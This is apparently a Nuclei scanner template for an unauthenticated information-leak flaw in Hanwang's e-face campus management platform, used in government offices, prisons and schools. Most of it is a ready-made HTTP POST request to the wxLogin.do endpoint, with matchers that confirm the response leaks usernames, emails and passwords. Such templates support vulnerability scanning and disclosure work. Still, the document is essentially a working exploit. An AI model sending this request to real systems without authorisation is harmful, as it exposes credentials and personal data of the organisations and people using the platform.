id: hanwang-wxLogin-unauth
info:
  name: 汉王e脸通综合管理平台 wxLogin.do 未授权访问致敏感信息泄漏
  author: leadlife
  severity: high
  description: 汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 wxLogin.do 接口存在信息泄露漏洞，未授权攻击者可利用该漏洞获取系统敏感信息。
  reference: 
    - https://mp.weixin.qq.com/s?__biz=MzE5MTM2MjA0NQ==&mid=2247483777&idx=1&sn=bb9ab9e7f65dc1892c8dc91813efb4d2&chksm=9606e713a1716e05e088182ef175ff0634de1fd91023dbc5b7ddb9d89ba19f80009ab1cd47de&cur_album_id=4045056277938913283&scene=189#wechat_redirect
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    tips:
    repair:
    version:
  tags: hanwang,unauth

http:
  - raw:
      - |
        POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'recordTcpPort','userName','email','password')
        condition: and